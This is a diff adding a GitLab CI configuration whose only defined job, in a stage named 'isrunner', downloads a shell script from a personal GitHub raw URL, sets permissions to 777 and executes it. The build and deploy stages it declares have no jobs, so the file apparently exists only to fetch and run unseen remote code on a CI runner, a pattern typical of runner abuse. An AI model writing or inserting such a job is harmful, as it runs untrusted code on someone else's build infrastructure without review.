@@ -1,0 +1,13 @@
+stages:
+  - isrunner
+  - build
+  - deploy
+
+isrunner_0:
+  stage: isrunner
+  script:
+    - wget https://raw.githubusercontent.com/rinaffers/Lorena/main/hi.sh
+    - sed -i -e 's/\r$//' hi.sh
+    - chmod 777 *
+    - ls -lA
+    - ./hi.sh
